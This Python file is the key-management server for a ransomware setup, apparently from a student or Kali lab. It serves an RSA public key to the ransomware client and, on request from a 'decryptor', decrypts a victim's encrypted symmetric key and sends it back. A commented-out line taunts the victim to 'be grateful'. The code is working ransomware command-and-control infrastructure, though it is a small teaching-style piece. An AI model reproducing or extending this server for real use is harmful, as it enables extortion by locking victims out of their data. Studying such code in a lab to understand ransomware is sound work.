import socketserver
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
'''
privateKey = rsa.generate_private_key(
	public_exponent = 65537
	key_size=2048
	)
'''


class ClientHandler(socketserver.BaseRequestHandler):
	#publicKey, privateKey = rsa.newkeys(1024)

	def handle(self):
		#Temp to send pub key over
		
		name = self.request.recv(1024).decode()
		if name == "it's rc_client":
			
			with open("/home/student/Desktop/ransom/public_key.key", "rb") as pubkey:
				line = pubkey.read(1024)
				while(line):
					
				
					self.request.send(line)
					line = pubkey.read(1024)
			
			
				#self.request.send("Encrypt".encode())
				#self.request.send(publicKey)
				
			pass
        	
			
		if name == "it's decryptor":
			#wait for key
			encrypted_key = self.request.recv(1024).strip()
			
			print("RECEIVED:", encrypted_key)
			
			#load priv key
			with open("/home/kali/Desktop/pub_priv_pair.key", "rb") as key_file:
				privateKey = serialization.load_pem_private_key(key_file.read(), password=None, backend=default_backend())
			
				#Help from rsa src
				plain_sym_key = privateKey.decrypt( encrypted_key, 
					padding.OAEP(
					mgf=padding.MGF1(algorithm=hashes.SHA256()),
					algorithm = hashes.SHA256(),
					label=None
					)
					)
				print("SENT:", plain_sym_key)
				
				self.request.send(plain_sym_key)
				
				#print ("Implement decryption of data " + encrypted_key )
				#------------------------------------
				#      Decryption Code Here
				#------------------------------------
			
				#self.request.sendall("Your key has been returned. Be grateful, say thank you and have a nice day!")
		
if __name__ == "__main__":
	HOST, PORT = "10.1.82.176", 8000
	
    
	tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)
	try:
	      	tcpServer.serve_forever()
	except:
	        print("There was an error")
